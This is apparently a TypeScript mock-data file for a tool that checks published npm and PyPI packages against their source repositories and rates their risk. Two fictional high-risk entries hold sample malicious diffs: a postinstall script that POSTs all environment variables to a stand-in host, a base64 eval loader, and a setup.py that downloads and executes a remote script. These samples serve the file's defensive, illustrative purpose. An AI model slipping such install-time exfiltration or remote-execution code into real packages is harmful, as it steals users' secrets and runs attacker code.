// Mock data and mock API behaviour. Only src/services/analysisService.ts imports this file.
import type {
  AnalysisRequest, AnalysisResult, AnalysisSummary, ChangeType, ComparisonSummary,
  Ecosystem, FileChange, Provenance, RiskAssessment, RiskLevel, RiskStatus,
} from '../types/analysis';

const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
const f = (path: string, changeType: ChangeType, risk: RiskLevel, reason?: string, diff?: string): FileChange => ({ path, changeType, risk, reason, diff });

type Detail = {
  risk: RiskAssessment;
  aiExplanation: string;
  files: FileChange[];
  extraUnchanged: number;
  provenance: Omit<Provenance, 'sourceRepo'>;
};

const s = (id: string, name: string, ecosystem: Ecosystem, version: string, repo: string, status: RiskStatus, createdAt: string): AnalysisSummary => ({
  id, package: { name, ecosystem, version }, sourceRepo: `https://github.com/${repo}`, status, createdAt,
});

const summaries: AnalysisSummary[] = [
  s('a2', 'fast-csv-parse', 'npm', '2.1.4', 'dataflow-labs/fast-csv-parse', 'high_risk', '2026-10-30T16:20:00Z'),
  s('a1', 'axios', 'npm', '1.7.9', 'axios/axios', 'verified', '2026-10-30T09:05:00Z'),
  s('a4', 'colorize-term', 'npm', '1.8.0', 'termkit/colorize-term', 'warning', '2026-10-29T14:42:00Z'),
  s('a3', 'requests', 'PyPI', '2.32.3', 'psf/requests', 'verified', '2026-10-28T11:30:00Z'),
  s('a5', 'pyyaml-fast', 'PyPI', '1.0.3', 'yaml-tools/pyyaml-fast', 'high_risk', '2026-10-27T18:12:00Z'),
  s('a6', 'express', 'npm', '4.21.2', 'expressjs/express', 'verified', '2026-10-26T08:55:00Z'),
  s('a7', 'flask', 'PyPI', '3.1.0', 'pallets/flask', 'verified', '2026-10-24T13:18:00Z'),
  s('a9', 'httpx-retry', 'PyPI', '0.4.2', 'netkit/httpx-retry', 'warning', '2026-10-22T10:01:00Z'),
  s('a8', 'zod', 'npm', '3.23.8', 'colinhacks/zod', 'verified', '2026-10-20T15:47:00Z'),
  s('a12', 'left-trim-all', 'npm', '1.2.0', 'stringlab/left-trim-all', 'warning', '2026-10-18T09:30:00Z'),
  s('a11', 'pydantic', 'PyPI', '2.10.3', 'pydantic/pydantic', 'verified', '2026-10-15T12:10:00Z'),
  s('a10', 'date-fns', 'npm', '4.1.0', 'date-fns/date-fns', 'verified', '2026-10-12T17:25:00Z'),
];

const okProv = (commit: string, at: string, publisher: string): Detail['provenance'] => ({
  sourceCommit: commit, publishedAt: at, publisher, registryChecksum: 'sha512-q3Hn8e1c0xk2ZbVw7mRtYp4uLd9aQ==',
  signatureVerified: true, buildProvenance: true, attestation: 'Build attestation links this release to the tagged commit.',
});

const details: Record<string, Detail> = {
  a1: {
    risk: { status: 'verified', score: 4, findings: ['Published files match the repository at tag v1.7.9.', 'Differences are limited to build output and version metadata.'] },
    aiExplanation: 'This release matches the source repository. The only differences are the compiled bundles and version fields that the project build produces, and there are no files or install scripts outside the repository.',
    extraUnchanged: 61,
    files: [
      f('package.json', 'modified', 'low', 'Version and publish metadata differ as expected.', '@@ package.json @@\n-  "version": "1.7.8",\n+  "version": "1.7.9",'),
      f('dist/axios.js', 'modified', 'low', 'Bundle generated from the repository source at build time.'),
      f('CHANGELOG.md', 'unchanged', 'none'),
      f('LICENSE', 'unchanged', 'none'),
    ],
    provenance: okProv('b3e1f0c', '2026-10-30T08:40:00Z', 'axios-release-bot'),
  },
  a2: {
    risk: { status: 'high_risk', score: 91, findings: ['An install script was added that is not in the repository.', 'scripts/setup.js sends environment variables to an external host.', 'dist/parser.js contains obfuscated code that the repository build does not produce.'] },
    aiExplanation: 'This release should not be installed. It adds a postinstall script and an obfuscated block in the parser that cannot be traced to the repository. Together they read environment variables and send them to an outside server during installation.',
    extraUnchanged: 38,
    files: [
      f('scripts/setup.js', 'added', 'high', 'Not present in the source repository. Reads environment variables and makes an outbound network request.',
        "+const https = require('https');\n+const data = JSON.stringify(process.env);\n+https\n+  .request({ host: 'telemetry-cdn.example', method: 'POST', path: '/c' })\n+  .end(data);"),
      f('dist/parser.js', 'modified', 'high', 'Contains an obfuscated block that the repository build does not produce.',
        "@@ dist/parser.js @@\n   module.exports = parse;\n+eval(Buffer.from('cmVxdWlyZSgnLi4vc2NyaXB0cy9zZXR1cCcp', 'base64').toString());"),
      f('package.json', 'modified', 'medium', 'A postinstall script was added.', '@@ scripts @@\n   "build": "tsc",\n+  "postinstall": "node scripts/setup.js"'),
      f('README.md', 'modified', 'low', 'Documentation wording changed.'),
      f('.github/workflows/ci.yml', 'removed', 'low', 'Development file left out of the published package.', '-name: CI\n-on: [push]'),
      f('src/parser.ts', 'unchanged', 'none'),
    ],
    provenance: { sourceCommit: '9f3c2ab', publishedAt: '2026-10-30T15:58:00Z', publisher: 'dl-maintainer-2 (account created 6 days before publish)', registryChecksum: 'sha512-Zr7Ck0m4tH2yQe9LwX1pVg==', signatureVerified: false, buildProvenance: false, attestation: 'No build attestation. Published from a commit that is not tagged in the repository.' },
  },
  a4: {
    risk: { status: 'warning', score: 52, findings: ['A dependency that is not declared in the repository was added.', 'The build output includes a network helper with no matching source.'] },
    aiExplanation: 'Most of this release matches the repository, but the published manifest adds a dependency the repository does not list, and the bundle contains a network helper without matching source. This may be a packaging mistake, so review both files before upgrading.',
    extraUnchanged: 22,
    files: [
      f('package.json', 'modified', 'medium', 'Adds a dependency that is not declared in the repository.', '@@ dependencies @@\n   "supports-color": "^9.4.0",\n+  "tiny-http-agent": "^0.2.1"'),
      f('dist/index.js', 'modified', 'medium', 'Bundle includes a network helper with no matching source file.'),
      f('README.md', 'unchanged', 'none'),
    ],
    provenance: { sourceCommit: '71ad0e4', publishedAt: '2026-10-29T14:20:00Z', publisher: 'termkit-maintainers', registryChecksum: 'sha512-Mv2Nn6a8dLq0Ts1RbYk3Wg==', signatureVerified: true, buildProvenance: false, attestation: 'Signed by the maintainer, but no build attestation is available.' },
  },
  a5: {
    risk: { status: 'high_risk', score: 87, findings: ['setup.py downloads and runs a script at install time.', 'A loader module was added that does not exist in the repository.'] },
    aiExplanation: 'The package runs code from a remote address when it is installed, and ships a loader module that is not in the repository. Treat this release as compromised and avoid installing it.',
    extraUnchanged: 17,
    files: [
      f('setup.py', 'modified', 'high', 'Downloads and executes a remote script during installation.', "@@ setup.py @@\n+import urllib.request\n+exec(urllib.request.urlopen('http://pkg-mirror.example/i.py').read())"),
      f('pyyaml_fast/_loader.py', 'added', 'high', 'Not present in the source repository.', '+import os, base64\n+exec(base64.b64decode(os.environ.get("PYF_CFG", "")))'),
      f('pyyaml_fast/core.py', 'modified', 'low', 'Minor formatting changes.'),
      f('README.md', 'unchanged', 'none'),
    ],
    provenance: { sourceCommit: undefined, publishedAt: '2026-10-27T17:50:00Z', publisher: 'ymltools-dev', registryChecksum: 'sha256-8d3b1f0a97c24e5d6b7a', signatureVerified: false, buildProvenance: false, attestation: 'No source commit could be matched to this release.' },
  },
};

const generic = (sum: AnalysisSummary): Detail => {
  const npm = sum.package.ecosystem === 'npm';
  const manifest = npm ? 'package.json' : 'pyproject.toml';
  const entry = npm ? 'dist/index.js' : `${sum.package.name.replace(/-/g, '_')}/__init__.py`;
  const prov = okProv('3e1f9a7', sum.createdAt, `${sum.package.name}-maintainers`);
  if (sum.status === 'verified') {
    return {
      risk: { status: 'verified', score: 5, findings: ['Published files match the repository at the release tag.', 'Differences are limited to expected build output and metadata.'] },
      aiExplanation: 'This release matches the source repository. The differences come from the normal build and publish process, and no unexpected files were found.',
      extraUnchanged: 30,
      files: [
        f(manifest, 'modified', 'low', 'Version and publish metadata differ as expected.', `@@ ${manifest} @@\n-version = previous\n+version = ${sum.package.version}`),
        f(entry, 'modified', 'low', 'Generated from the repository source at build time.'),
        f('README.md', 'unchanged', 'none'),
        f('LICENSE', 'unchanged', 'none'),
      ],
      provenance: prov,
    };
  }
  return {
    risk: { status: 'warning', score: 48, findings: ['The published manifest differs from the repository in a way the build does not explain.', 'Part of the build output has no matching source.'] },
    aiExplanation: 'Most of this release matches the repository, but the manifest and build output contain changes that cannot be traced to source. This may be a packaging mistake, so review the flagged files before upgrading.',
    extraUnchanged: 14,
    files: [
      f(manifest, 'modified', 'medium', 'Contains a change that is not in the repository.', `@@ ${manifest} @@\n+# entry added at publish time`),
      f(entry, 'modified', 'medium', 'Build output includes code with no matching source.'),
      f('README.md', 'unchanged', 'none'),
    ],
    provenance: { ...prov, buildProvenance: false, attestation: 'No build attestation is available for this release.' },
  };
};

const compare = (files: FileChange[], extra: number): ComparisonSummary => {
  const n = (t: ChangeType) => files.filter((x) => x.changeType === t).length;
  return { added: n('added'), removed: n('removed'), modified: n('modified'), unchanged: n('unchanged') + extra };
};

const build = (sum: AnalysisSummary): AnalysisResult => {
  const d = details[sum.id] ?? generic(sum);
  return { ...sum, risk: d.risk, aiExplanation: d.aiExplanation, files: d.files, comparison: compare(d.files, d.extraUnchanged), provenance: { sourceRepo: sum.sourceRepo, ...d.provenance } };
};

export async function mockGetHistory(): Promise<AnalysisSummary[]> {
  await wait(400);
  return [...summaries];
}

export async function mockGetResult(id: string): Promise<AnalysisResult> {
  await wait(500);
  const sum = summaries.find((x) => x.id === id);
  if (!sum) throw new Error('This analysis could not be found.');
  return build(sum);
}

export async function mockStartAnalysis(req: AnalysisRequest): Promise<{ id: string }> {
  await wait(1800);
  const hash = [...req.name].reduce((a, ch) => a + ch.charCodeAt(0), 0) % 3;
  const status: RiskStatus = (['verified', 'warning', 'high_risk'] as const)[hash];
  const sum: AnalysisSummary = {
    id: `a${Date.now()}`, package: { name: req.name, ecosystem: req.ecosystem, version: req.version },
    sourceRepo: req.repoUrl, status, createdAt: new Date().toISOString(),
  };
  summaries.unshift(sum);
  return { id: sum.id };
}
